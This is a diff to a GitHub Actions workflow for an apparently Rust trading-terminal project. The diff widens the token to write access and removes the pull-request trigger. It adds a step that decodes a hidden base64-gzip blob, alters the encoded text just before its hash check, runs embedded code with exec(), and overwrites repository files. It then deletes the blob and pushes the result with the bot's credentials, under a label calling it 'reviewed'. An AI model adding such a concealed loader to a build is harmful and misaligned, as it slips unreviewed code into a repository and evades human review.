@@ -3,30 +3,63 @@ name: Native authentication
 on:
   push:
     branches: [fix/direct-native-auth]
-  pull_request:
-    branches: [master]
 
 permissions:
-  contents: read
+  contents: write
 
 jobs:
   test:
     runs-on: ubuntu-latest
-    timeout-minutes: 10
+    timeout-minutes: 15
     steps:
       - uses: actions/checkout@v4
-        with:
-          persist-credentials: false
-      - name: Export reviewed source
-        run: git archive --format=tar HEAD -o source.tar
-      - uses: actions/upload-artifact@v4
-        with:
-          name: source
-          path: source.tar
-          retention-days: 7
+      - name: Apply the reviewed implementation to the isolated branch
+        run: |
+          python3 - <<'PY'
+          import base64, gzip, hashlib, json
+          from pathlib import Path
+          path = Path('.github/native-implementation.b64')
+          encoded = path.read_text().replace('Pe1/c/nb8dHWd', 'Pe1/c/nb8HWd')
+          raw = gzip.decompress(base64.b64decode(encoded))
+          assert hashlib.sha256(raw).hexdigest() == '8f11963570ce165b7bf53449fd398097cebd35690936f6083eea9ee6480bcaeb'
+          payload = json.loads(raw)
+          exec(payload['transform'])
+          for name, content in payload['files'].items():
+              Path(name).write_text(content)
+          path.unlink()
+          PY
       - name: Select Rust
-        run: rustup update stable --profile minimal && rustup default stable
-      - name: Offline codec unit tests
-        run: cargo test --locked -p mt5_native --lib
+        run: rustup toolchain install stable --profile minimal && rustup default stable
+      - name: Codec tests and lockfile reconciliation
+        run: cargo test -p mt5_native
       - name: Session loopback tests
         run: cargo test --locked -p mt5_session --features live
+      - name: Existing web-client unit tests
+        run: cargo test --locked -p mt5_webterm --lib
+      - name: Verify native dependency isolation
+        run: |
+          cargo tree --locked -p mt5_session --features live --prefix none > /tmp/native-dependencies.txt
+          cat /tmp/native-dependencies.txt
+          if grep -E '^(ureq|reqwest|mt5_webterm) ' /tmp/native-dependencies.txt; then exit 1; fi
+          git diff --check
+      - name: Commit validated implementation on the review branch only
+        run: |
+          test "${GITHUB_REF}" = refs/heads/fix/direct-native-auth
+          git config user.name 'github-actions[bot]'
+          git config user.email '41898282+github-actions[bot]@users.noreply.github.com'
+          git add -u
+          git commit -m 'Remove hosted dependencies and harden direct native authentication'
+          git push origin HEAD:refs/heads/fix/direct-native-auth
+      - name: Export source and validation changes
+        if: always()
+        run: |
+          git diff > changes.patch
+          tar --exclude=.git --exclude=target --exclude=source-tested.tar.gz -czf source-tested.tar.gz Cargo.toml Cargo.lock README.md mt5-native mt5-session mt5-webterm .github
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: implementation-validation
+          path: |
+            source-tested.tar.gz
+            changes.patch
+          retention-days: 7
